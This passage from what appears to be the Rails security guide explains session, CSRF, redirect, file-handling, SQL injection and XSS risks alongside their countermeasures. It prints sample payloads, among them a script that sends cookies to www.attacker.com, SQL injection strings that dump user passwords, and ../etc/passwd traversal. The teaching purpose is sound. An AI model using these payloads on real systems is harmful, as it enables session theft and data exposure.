* They maintain the session by accessing the web application periodically in order to keep an expiring session alive.
* The attacker forces the user's browser into using this session ID (see number 3 in the image). As you may not change a cookie of another domain (because of the same origin policy), the attacker has to run a JavaScript from the domain of the target web application. Injecting the JavaScript code into the application by XSS accomplishes this attack. Here is an example: `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`. Read more about XSS and injection later on.
* The attacker lures the victim to the infected page with the JavaScript code. By viewing the page, the victim's browser will change the session ID to the trap session ID.
* As the new trap session is unused, the web application will require the user to authenticate.
* From now on, the victim and the attacker will co-use the web application with the same session: The session became valid and the victim didn't notice the attack.

### Session Fixation - Countermeasures

TIP: _One line of code will protect you from session fixation._

The most effective countermeasure is to _issue a new session identifier_ and declare the old one invalid after a successful login. That way, an attacker cannot use the fixed session identifier. This is a good countermeasure against session hijacking, as well. Here is how to create a new session in Rails:

```ruby
reset_session
```

If you use the popular [Devise](https://rubygems.org/gems/devise) gem for user management, it will automatically expire sessions on sign in and sign out for you. If you roll your own, remember to expire the session after your sign in action (when the session is created). This will remove values from the session, therefore _you will have to transfer them to the new session_.

Another countermeasure is to _save user-specific properties in the session_, verify them every time a request comes in, and deny access, if the information does not match. Such properties could be the remote IP address or the user agent (the web browser name), though the latter is less user-specific. When saving the IP address, you have to bear in mind that there are Internet service providers or large organizations that put their users behind proxies. _These might change over the course of a session_, so these users will not be able to use your application, or only in a limited way.

### Session Expiry

NOTE: _Sessions that never expire extend the time-frame for attacks such as cross-site request forgery (CSRF), session hijacking, and session fixation._

One possibility is to set the expiry time-stamp of the cookie with the session ID. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to _expire sessions in a database table_. Call `Session.sweep(20.minutes)` to expire sessions that were used longer than 20 minutes ago.

```ruby
class Session < ApplicationRecord
  def self.sweep(time = 1.hour)
    where(updated_at: ...time.ago).delete_all
  end
end
```

The section about session fixation introduced the problem of maintained sessions. An attacker maintaining a session every five minutes can keep the session alive forever, although you are expiring sessions. A simple solution for this would be to add a `created_at` column to the sessions table. Now you can delete sessions that were created a long time ago. Use this line in the sweep method above:

```ruby
where(updated_at: ...time.ago).or(where(created_at: ...2.days.ago)).delete_all
```

Cross-Site Request Forgery (CSRF)
---------------------------------

This attack method works by including malicious code or a link in a page that accesses a web application that the user is believed to have authenticated. If the session for that web application has not timed out, an attacker may execute unauthorized commands.

![Cross-Site Request Forgery](images/security/csrf.png)

In the [session chapter](#sessions) you have learned that most Rails applications use cookie-based sessions. Either they store the session ID in the cookie and have a server-side session hash, or the entire session hash is on the client-side. In either case the browser will automatically send along the cookie on every request to a domain, if it can find a cookie for that domain. The controversial point is that if the request comes from a site of a different domain, it will also send the cookie. Let's start with an example:

* Bob browses a message board and views a post from a hacker where there is a crafted HTML image element. The element references a command in Bob's project management application, rather than an image file: `<img src="http://www.webapp.com/project/1/destroy">`
* Bob's session at `www.webapp.com` is still alive, because he didn't log out a few minutes ago.
* By viewing the post, the browser finds an image tag. It tries to load the suspected image from `www.webapp.com`. As explained before, it will also send along the cookie with the valid session ID.
* The web application at `www.webapp.com` verifies the user information in the corresponding session hash and destroys the project with the ID 1. It then returns a result page which is an unexpected result for the browser, so it will not display the image.
* Bob doesn't notice the attack - but a few days later he finds out that project number one is gone.

It is important to notice that the actual crafted image or link doesn't necessarily have to be situated in the web application's domain, it can be anywhere - in a forum, blog post, or email.

CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) - less than 0.1% in 2006 - but it really is a 'sleeping giant' [Grossman]. This is in stark contrast to the results in many security contract works - _CSRF is an important security issue_.

### CSRF Countermeasures

NOTE: _First, as is required by the W3C, use GET and POST appropriately. Secondly, a security token in non-GET requests will protect your application from CSRF._

#### Use GET and POST Appropriately

The HTTP protocol basically provides two main types of requests - GET and POST (DELETE, PUT, and PATCH should be used like POST, while QUERY — a safe, read-only method that carries its query in the request body — should be used like GET). The World Wide Web Consortium (W3C) provides a checklist for choosing HTTP GET or POST:

**Use GET if:**

* The interaction is more _like a question_ (i.e., it is a safe operation such as a query, read operation, or lookup).

**Use POST if:**

* The interaction is more _like an order_, or
* The interaction _changes the state_ of the resource in a way that the user would perceive (e.g., a subscription to a service), or
* The user is _held accountable for the results_ of the interaction.

If your web application is RESTful, you might be used to additional HTTP verbs, such as PATCH, PUT, or DELETE. Some legacy web browsers, however, do not support them - only GET and POST. Rails uses a hidden `_method` field to handle these cases.

The HTTP QUERY method ([RFC 10008](https://www.rfc-editor.org/rfc/rfc10008.html)) is safe and idempotent like GET, but conveys the query in the request body. Like GET and HEAD, QUERY requests are not checked for the security token: HTML forms cannot issue QUERY requests, and cross-origin QUERY requests from scripts always require a CORS preflight. This exemption applies only to requests that actually arrive with the QUERY method: a request tunneled through a form POST with `_method=query` is verified like any other POST, since an ordinary form submission enjoys none of those structural protections. As with GET, never change state in response to a QUERY request.

_POST requests can be sent automatically, too_. In this example, the link www.harmless.com is shown as the destination in the browser's status bar. But it has actually dynamically created a new form that sends a POST request.

```html
<a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;">To the harmless survey</a>
```

Or the attacker places the code into the onmouseover event handler of an image:

```html
<img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
```

There are many other possibilities, like using a `<script>` tag to make a cross-site request to a URL with a JSONP or JavaScript response. The response is executable code that the attacker can find a way to run, possibly extracting sensitive data. To protect against this data leakage, we must disallow cross-site `<script>` tags. Ajax requests, however, obey the browser's same-origin policy (only your own site is allowed to initiate `XmlHttpRequest`) so we can safely allow them to return JavaScript responses.

NOTE: We can't distinguish a `<script>` tag's origin—whether it's a tag on your own site or on some other malicious site—so we must block all `<script>` across the board, even if it's actually a safe same-origin script served from your own site. In these cases, explicitly skip CSRF protection on actions that serve JavaScript meant for a `<script>` tag.

#### Required Security Token

To protect against all other forged requests, we introduce a _required security token_ that our site knows but other sites don't know. We include the security token in requests and verify it on the server. This is done automatically when [`config.action_controller.default_protect_from_forgery`][] is set to `true`, which is the default for newly created Rails applications. You can also do it manually by adding the following to your application controller:

```ruby
protect_from_forgery with: :exception
```

This will include a security token in all forms generated by Rails. If the
security token doesn't match what was expected, an exception will be thrown.

When submitting forms with [Turbo](https://turbo.hotwired.dev/) the security
token is required as well. Turbo looks for the token in the `csrf` meta tags of
your application layout and adds it to request in the `X-CSRF-Token` request
header. These meta tags are created with the [`csrf_meta_tags`][] helper
method:

```erb
<head>
  <%= csrf_meta_tags %>
</head>
```

which results in:

```html
<head>
  <meta name="csrf-param" content="authenticity_token" />
  <meta name="csrf-token" content="THE-TOKEN" />
</head>
```

When making your own non-GET requests from JavaScript the security token is
required as well. [Rails Request.JS](https://github.com/rails/request.js) is a
JavaScript library that encapsulates the logic of adding the required request
headers.

When using another library to make Ajax calls, it is necessary to add the
security token as a default header yourself. To get the token from the meta tag
you could do something like:

```javascript
document.head.querySelector("meta[name=csrf-token]")?.content
```

#### Clearing Persistent Cookies

It is common to use persistent cookies to store user information, with `cookies.permanent` for example. In this case, the cookies will not be cleared and the out of the box CSRF protection will not be effective. If you are using a different cookie store than the session for this information, you must handle what to do with it yourself:

```ruby
rescue_from ActionController::InvalidCrossOriginRequest do |exception|
  sign_out_user # Example method that will destroy the user cookies
end
```

The above method can be placed in the `ApplicationController` and will be called when a CSRF token is not present or is incorrect on a non-GET request.

Note that _cross-site scripting (XSS) vulnerabilities bypass all CSRF protections_. XSS gives the attacker access to all elements on a page, so they can read the CSRF security token from a form or directly submit the form. Read [more about XSS](#cross-site-scripting-xss) later.

[`config.action_controller.default_protect_from_forgery`]: configuring.html#config-action-controller-default-protect-from-forgery
[`csrf_meta_tags`]: https://api.rubyonrails.org/classes/ActionView/Helpers/CsrfHelper.html#method-i-csrf_meta_tags

Redirection and Files
---------------------

Another class of security vulnerabilities surrounds the use of redirection and files in web applications.

### Redirection

WARNING: _Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap website, they may also create a self-contained attack._

Whenever the user is allowed to pass (parts of) the URL for redirection, it is possibly vulnerable. The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by XSS in the web application or putting the link into an external site. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: http://www.example.com/site/redirect?to=www.attacker.com. Here is an example of a legacy action:

```ruby
def legacy
  redirect_to(params.update(action: "main"))
end
```

This will redirect the user to the main action if they try to access a legacy action. The intention was to preserve the URL parameters to the legacy action and pass them to the main action. However, it can be exploited by an attacker if they include a host key in the URL:

```
http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
```

If it is at the end of the URL it will hardly be noticed and redirects the user to the `attacker.com` host. As a general rule, passing user input directly into `redirect_to` is considered dangerous. A simple countermeasure would be to _include only the expected parameters in a legacy action_ (again a permitted list approach, as opposed to removing unexpected parameters). _And if you redirect to a URL, check it with a permitted list or a regular expression_.

#### Self-contained XSS

Another redirection and self-contained XSS attack works in Firefox and Opera by the use of the data protocol. This protocol displays its contents directly in the browser and can be anything from HTML or JavaScript to entire images:

`data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`

This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection URL, an attacker could redirect to this URL with the malicious code in it. As a countermeasure, _do not allow the user to supply (parts of) the URL to be redirected to_.

### File Uploads

NOTE: _Make sure file uploads don't overwrite important files, and process media files asynchronously._

Many web applications allow users to upload files. _File names, which the user may choose (partly), should always be filtered_ as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like "../../../etc/passwd", it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so - one more reason to run web servers, database servers, and other programs as a less privileged Unix user.

When filtering user input file names, _don't try to remove malicious parts_. Think of a situation where the web application removes all "../" in a file name and an attacker uses a string such as "....//" - the result will be "../". It is best to use a permitted list approach, which _checks for the validity of a file name with a set of accepted characters_. This is opposed to a restricted list approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the [attachment_fu plugin](https://github.com/technoweenie/attachment_fu/tree/master):

```ruby
def sanitize_filename(filename)
  filename.strip.tap do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.sub!(/\A.*(\\|\/)/, "")
    # Finally, replace all non-alphanumeric, underscore
    # or periods with underscore
    name.gsub!(/[^\w.-]/, "_")
  end
end
```

A significant disadvantage of synchronous processing of file uploads (as the `attachment_fu` plugin may do with images), is its _vulnerability to denial-of-service attacks_. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.

The solution to this is best to _process media files asynchronously_: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.

### Executable Code in File Uploads

WARNING: _Source code in uploaded files may be executed when placed in specific directories. Do not place file uploads in Rails' /public directory if it is Apache's home directory._

The popular Apache web server has an option called DocumentRoot. This is the home directory of the website, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are PHP and CGI files. Now think of a situation where an attacker uploads a file "file.cgi" with code in it, which will be executed when someone downloads the file.

_If your Apache DocumentRoot points to Rails' /public directory, do not put file uploads in it_, store files at least one level upwards.

### Media Processing of File Uploads

WARNING: _ffmpeg and ffprobe decode untrusted media in memory-unsafe code. Restrict the codecs and formats they will accept._

Active Storage shells out to ffmpeg to generate video previews, and to ffprobe to extract video and audio metadata. Neither tool is shipped by Rails, and a stock ffmpeg build registers several hundred decoders and demuxers where an application needs a handful. Attachments are analyzed on upload by default, so ffprobe reads attacker-supplied bytes without any further interaction.

Narrow that attack surface by naming the codecs these tools may decode. An application that accepts only H.264 video with AAC audio would configure:

```ruby
config.active_storage.video_preview_input_arguments = "-codec_whitelist h264,aac"
config.active_storage.ffprobe_arguments = "-codec_whitelist h264,aac"
```

Alongside `-codec_whitelist`, `-f` forces a single demuxer and `-protocol_whitelist` restricts the protocols an input may reference.

Every codec present in a stored file must appear in the list, audio codecs included. ffprobe exits with an error on a file that uses any other codec, and analysis of that file then raises `JSON::ParserError`. Codec names vary between ffmpeg builds, so check the list against `ffmpeg -decoders` for the build you deploy.

### File Downloads

NOTE: _Make sure users cannot download arbitrary files._

Just as you have to filter file names for uploads, you have to do so for downloads. The `send_file()` method sends files from the server to the client. If you use a file name, that the user entered, without filtering, any file can be downloaded:

```ruby
send_file("/var/www/uploads/" + params[:filename])
```

Simply pass a file name like "../../../etc/passwd" to download the server's login information. A simple solution against this, is to _check that the requested file is in the expected directory_:

```ruby
basename = File.expand_path("../../files", __dir__)
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename != File.expand_path(File.dirname(filename))
send_file filename, disposition: "inline"
```

Another (additional) approach is to store the file names in the database and name the files on the disk after the ids in the database. This is also a good approach to avoid possible code in an uploaded file from being executed. The `attachment_fu` plugin does this in a similar way.

User Management
---------------

### Brute-Forcing Accounts

NOTE: _Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with rate-limiting, more generic error messages and possibly require to enter a CAPTCHA._

A list of usernames for your web application may be misused to brute-force the corresponding passwords, because most people don't use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of usernames and a dictionary, an automatic program may find the correct password in a matter of minutes.

Because of this, most web applications will display a generic error message "username or password not correct", if one of these are not correct. If it said "the username you entered has not been found", an attacker could automatically compile a list of usernames.

However, what most web application designers neglect, are the forgot-password pages. These pages often admit that the entered username or e-mail address has (not) been found. This allows an attacker to compile a list of usernames and brute-force the accounts.

In order to mitigate such attacks, you can use rate limiting. Rails comes with a
built-in [rate-limiter](https://edgeapi.rubyonrails.org/classes/ActionController/RateLimiting/ClassMethods.html#method-i-rate_limit). You can enable it in your sessions controller with a single line:

```
class SessionsController < ApplicationController
  rate_limit to: 10, within: 3.minutes, only: :create
end
```

Refer to the [API documentation](https://edgeapi.rubyonrails.org/classes/ActionController/RateLimiting/ClassMethods.html#method-i-rate_limit) for details about the various parameters.

Additionally, you can _display a generic error message on forgot-password pages, too_. Moreover, you can _require to enter a CAPTCHA after a number of failed logins from a certain IP address_.

NOTE: All of these mitigation techniques are not a bullet-proof solution against automatic programs, because these programs may change their IP address exactly as often. However, it raises the barrier of an attack.


### Account Hijacking

Many web applications make it easy to hijack user accounts. Why not be different and make it more difficult?

#### Passwords

Think of a situation where an attacker has stolen a user's session cookie and thus may co-use the application. If it is easy to change the password, the attacker will hijack the account with a few clicks. Or if the change-password form is vulnerable to CSRF, the attacker will be able to change the victim's password by luring them to a web page where there is a crafted IMG-tag which does the CSRF. As a countermeasure, _make change-password forms safe against CSRF_, of course. And _require the user to enter the old password when changing it_.

#### E-Mail

However, the attacker may also take over the account by changing the e-mail address. After they change it, they will go to the forgotten-password page and the (possibly new) password will be mailed to the attacker's e-mail address. As a countermeasure _require the user to enter the password when changing the e-mail address, too_.

#### Other

Depending on your web application, there may be more ways to hijack the user's account. In many cases CSRF and XSS will help to do so. For example, as in a CSRF vulnerability in [Google Mail](https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). In this proof-of-concept attack, the victim would have been lured to a website controlled by the attacker. On that site is a crafted IMG-tag which results in an HTTP GET request that changes the filter settings of Google Mail. If the victim was logged in to Google Mail, the attacker would change the filters to forward all e-mails to their e-mail address. This is nearly as harmful as hijacking the entire account. As a countermeasure, _review your application logic and eliminate all XSS and CSRF vulnerabilities_.

### CAPTCHAs

INFO: _A CAPTCHA is a challenge-response test to determine that the response is not generated by a computer. It is often used to protect registration forms from attackers and comment forms from automatic spam bots by asking the user to type the letters of a distorted image. This is the positive CAPTCHA, but there is also the negative CAPTCHA. The idea of a negative CAPTCHA is not for a user to prove that they are human, but to reveal that a robot is a robot._

A popular positive CAPTCHA API is [reCAPTCHA](https://developers.google.com/recaptcha/) which displays two distorted images of words from old books. It also adds an angled line, rather than a distorted background and high levels of warping on the text as earlier CAPTCHAs did, because the latter were broken. As a bonus, using reCAPTCHA helps to digitize old books. [ReCAPTCHA](https://github.com/ambethia/recaptcha/) is also a Rails plug-in with the same name as the API.

You will get two keys from the API, a public and a private key, which you have to put into your Rails environment. After that you can use the recaptcha_tags method in the view, and the verify_recaptcha method in the controller. Verify_recaptcha will return false if the validation fails.
The problem with CAPTCHAs is that they have a negative impact on the user experience. Additionally, some visually impaired users have found certain kinds of distorted CAPTCHAs difficult to read. Still, positive CAPTCHAs are one of the best methods to prevent all kinds of bots from submitting forms.

Most bots are really naive. They crawl the web and put their spam into every form's field they can find. Negative CAPTCHAs take advantage of that and include a "honeypot" field in the form which will be hidden from the human user by CSS or JavaScript.

Note that negative CAPTCHAs are only effective against naive bots and won't suffice to protect critical applications from targeted bots. Still, the negative and positive CAPTCHAs can be combined to increase the performance, e.g., if the "honeypot" field is not empty (bot detected), you won't need to verify the positive CAPTCHA, which would require an HTTPS request to Google ReCaptcha before computing the response.

Here are some ideas on how to hide honeypot fields by JavaScript and/or CSS:

* position the fields off the visible area of the page
* make the elements very small or color them the same as the background of the page
* leave the fields displayed, but tell humans to leave them blank

The simplest negative CAPTCHA is one hidden honeypot field. On the server side, you will check the value of the field: If it contains any text, it must be a bot. Then, you can either ignore the post or return a positive result, but not save the post to the database. This way, the bot will be satisfied and move on.

You can find more sophisticated negative CAPTCHAs in Ned Batchelder's [blog post](https://nedbatchelder.com/text/stopbots.html):

* Include a field with the current UTC time-stamp in it and check it on the server. If it is too far in the past, or if it is in the future, the form is invalid.
* Randomize the field names
* Include more than one honeypot field of all types, including submission buttons

Note that this protects you only from automatic bots, targeted tailor-made bots cannot be stopped by this. So _negative CAPTCHAs might not be good to protect login forms_.

### Logging

WARNING: _Tell Rails not to put passwords in the log files._

By default, Rails logs all requests being made to the web application. But log files can be a huge security issue, as they may contain login credentials, credit card numbers et cetera. When designing a web application security concept, you should also think about what will happen if an attacker gets (full) access to the web server. Encrypting secrets and passwords in the database will be quite useless, if the log files list them in clear text. You can _filter certain request parameters from your log files_ by appending them to [`config.filter_parameters`][] in the application configuration. These parameters will be marked [FILTERED] in the log.

```ruby
config.filter_parameters << :password
```

NOTE: Provided parameters will be filtered out by partial matching regular
expression. Rails adds a list of default filters, including `:passw`,
`:secret`, and `:token`, in the appropriate initializer
(`initializers/filter_parameter_logging.rb`) to handle typical application
parameters like `password`, `password_confirmation` and `my_token`.

[`config.filter_parameters`]: configuring.html#config-filter-parameters

### Regular Expressions

INFO: _A common pitfall in Ruby's regular expressions is to match the string's beginning and end by ^ and $, instead of \A and \z._

Ruby uses a slightly different approach than many other languages to match the end and the beginning of a string. That is why even many Ruby and Rails books get this wrong. So how is this a security threat? Say you wanted to loosely validate a URL field and you used a simple regular expression like this:

```ruby
/^https?:\/\/[^\n]+$/i
```

This may work fine in some languages. However, _in Ruby `^` and `$` match the **line** beginning and line end_. And thus a URL like this passes the filter without problems:

```
javascript:exploit_code();/*
http://hi.com
*/
```

This URL passes the filter because the regular expression matches - the second line, the rest does not matter. Now imagine we had a view that showed the URL like this:

```ruby
link_to "Homepage", @user.homepage
```

The link looks innocent to visitors, but when it's clicked, it will execute the JavaScript function "exploit_code" or any other JavaScript the attacker provides.

To fix the regular expression, `\A` and `\z` should be used instead of `^` and `$`, like so:

```ruby
/\Ahttps?:\/\/[^\n]+\z/i
```

Since this is a frequent mistake, the format validator (validates_format_of) now raises an exception if the provided regular expression starts with ^ or ends with $. If you do need to use ^ and $ instead of \A and \z (which is rare), you can set the :multiline option to true, like so:

```ruby
# content should include a line "Meanwhile" anywhere in the string
validates :content, format: { with: /^Meanwhile$/, multiline: true }
```

Note that this only protects you against the most common mistake when using the format validator - you always need to keep in mind that ^ and $ match the **line** beginning and line end in Ruby, and not the beginning and end of a string.

### Privilege Escalation

WARNING: _Changing a single parameter may give the user unauthorized access. Remember that every parameter may be changed, no matter how much you hide or obfuscate it._

The most common parameter that a user might tamper with, is the id parameter, as in `http://www.domain.com/project/1`, whereas 1 is the id. It will be available in params in the controller. There, you will most likely do something like this:

```ruby
@project = Project.find(params[:id])
```

This is alright for some web applications, but certainly not if the user is not authorized to view all projects. If the user changes the id to 42, and they are not allowed to see that information, they will have access to it anyway. Instead, _query the user's access rights, too_:

```ruby
@project = @current_user.projects.find(params[:id])
```

Depending on your web application, there will be many more parameters the user can tamper with. As a rule of thumb, _no user input data is secure, until proven otherwise, and every parameter from the user is potentially manipulated_.

Don't be fooled by security by obfuscation and JavaScript security. Developer tools let you review and change every form's hidden fields. _JavaScript can be used to validate user input data, but certainly not to prevent attackers from sending malicious requests with unexpected values_. DevTools log every request and may repeat and change them. That is an easy way to bypass any JavaScript validations. And there are even client-side proxies that allow you to intercept any request and response from and to the Internet.

Injection
---------

INFO: _Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection._

Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query, or programming language, the shell, or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.

### Permitted Lists Versus Restricted Lists

NOTE: _When sanitizing, protecting, or verifying something, prefer permitted lists over restricted lists._

A restricted list can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a permitted list which lists the good e-mail addresses, public actions, good HTML tags, and so on. Although sometimes it is not possible to create a permitted list (in a SPAM filter, for example), _prefer to use permitted list approaches_:

* Use `before_action except: [...]` instead of `only: [...]` for security-related actions. This way you don't forget to enable security checks for newly added actions.
* Allow `<strong>` instead of removing `<script>` against Cross-Site Scripting (XSS). See below for details.
* Don't try to correct user input using restricted lists:
    * This will make the attack work: `"<sc<script>ript>".gsub("<script>", "")`
    * But reject malformed input

Permitted lists are also a good approach against the human factor of forgetting something in the restricted list.

### SQL Injection

INFO: _Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem._

#### Introduction

SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or read arbitrary data. Here is an example of how not to use user input data in a query:

```ruby
Project.where("name = '#{params[:name]}'")
```

This could be in a search action and the user may enter a project's name that they want to find. If a malicious user enters `' OR 1) --`, the resulting SQL query will be:

```sql
SELECT * FROM projects WHERE (name = '' OR 1) --')
```

The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.

#### Bypassing Authorization

Usually a web application includes access control. The user enters their login credentials and the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.

```ruby
User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

If an attacker enters `' OR '1'='1` as the name, and `' OR '2'>'1` as the password, the resulting SQL query will be:

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

This will simply find the first record in the database and grant access to this user.

#### Unauthorized Reading

The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let's take the example from above:

```ruby
Project.where("name = '#{params[:name]}'")
```

And now let's inject another query using the UNION statement:

```
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
```

This will result in the following SQL query:

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

The result won't be a list of projects (because there is no project with an empty name), but a list of usernames and their password. So hopefully you [securely hashed the passwords](#user-management) in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.

Also, the second query renames some columns with the AS statement so that the
Web application displays the values from the user table.

#### Countermeasures

Ruby on Rails has a built-in filter for special SQL characters, which will escape `'` , `"` , NULL character, and line breaks. *Using `Model.find(id)` or `Model.find_by_something(something)` automatically applies this countermeasure*. But in SQL fragments, especially *in conditions fragments (`where("...")`), the `connection.execute()` or `Model.find_by_sql()` methods, it has to be applied manually*.

Instead of passing a string, you can use positional handlers to sanitize tainted strings like this:

```ruby
Model.where("zip_code = ? AND quantity >= ?", entered_zip_code, entered_quantity).first
```

The first parameter is an SQL fragment with question marks. The second and third
parameter will replace the question marks with the value of the variables.

You can also use named handlers, the values will be taken from the hash used:

```ruby
values = { zip: entered_zip_code, qty: entered_quantity }
Model.where("zip_code = :zip AND quantity >= :qty", values).first
```

Additionally, you can split and chain conditionals valid for your use case:

```ruby
Model.where(zip_code: entered_zip_code).where("quantity >= ?", entered_quantity).first
```

Note that the previously mentioned countermeasures are only available in model instances. You can
try [`sanitize_sql`][] elsewhere. _Make it a habit to think about the security consequences
when using an external string in SQL_.

[`sanitize_sql`]: https://api.rubyonrails.org/classes/ActiveRecord/Sanitization/ClassMethods.html#method-i-sanitize_sql

### Cross-Site Scripting (XSS)

INFO: _The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off._

#### Entry Points

An entry point is a vulnerable URL and its parameters where an attacker can start an attack.

The most common entry points are message posts, user comments, and guest books, but project titles, document names, and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on websites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications or client-site proxies make it easy to change requests. There are also other attack vectors like banner advertisements.

XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the website to get confidential information or install malicious software through security holes in the web browser.

During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The Symantec Global Internet Security threat report also documented 239 browser plug-in vulnerabilities in the last six months of 2007. [Mpack](https://www.pandasecurity.com/en/mediacenter/malware/mpack-uncovered/) is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high-profile targets.

#### HTML/JavaScript Injection

The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. _Escaping user input is essential_.

Here is the most straightforward test to check for XSS:

```html
<script>alert('Hello');</script>
```

This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:

```html
<img src="javascript:alert('Hello')">
<table background="javascript:alert('Hello')">
```

##### Cookie Theft

These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the `document.cookie` property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The `document.cookie` property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:

```html
<script>document.write(document.cookie);</script>
```

For an attacker, of course, this is not useful, as the victim will see their own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review their web server's access log files to see the victim's cookie.

```html
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

The log files on www.attacker.com will read like this:

```
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
```

You can mitigate these attacks (in the obvious way) by adding the **httpOnly** flag to cookies, so that `document.cookie` may not be read by JavaScript. HTTP only cookies can be used from IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4, and Chrome 1.0.154 onwards. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies [will still be visible using Ajax](https://owasp.org/www-community/HttpOnly#browsers-supporting-httponly), though.

##### Defacement

With web page defacement, an attacker can do a lot of things, for example, present false information or lure the victim to the attacker's website to steal the cookie, login credentials, or other sensitive data. The most popular way is to include code from external sources by iframes:

```html
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
```

This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This `iframe` is taken from an actual attack on legitimate Italian sites using the [Mpack attack framework](https://isc.sans.edu/diary/MPack+Analysis/3015). Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.

A more specialized attack could overlap the entire website or display a login form, which looks the same as the site's original, but transmits the username and password to the attacker's site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one in its place, which redirects to a fake website.

Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but is included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":

```
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
```

##### Countermeasures

_It is very important to filter malicious input, but it is also important to escape the output of the web application_.

Especially for XSS, it is important to do _permitted input filtering instead of restricted_. Permitted list filtering states the values allowed as opposed to the values not allowed. Restricted lists are never complete.

Imagine a restricted list deletes `"script"` from the user input. Now the attacker injects `"<scrscriptipt>"`, and after the filter, `"<script>"` remains. Earlier versions of Rails used a restricted list approach for the `strip_tags()`, `strip_links()`, and `sanitize()` methods. So this kind of injection was possible:

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

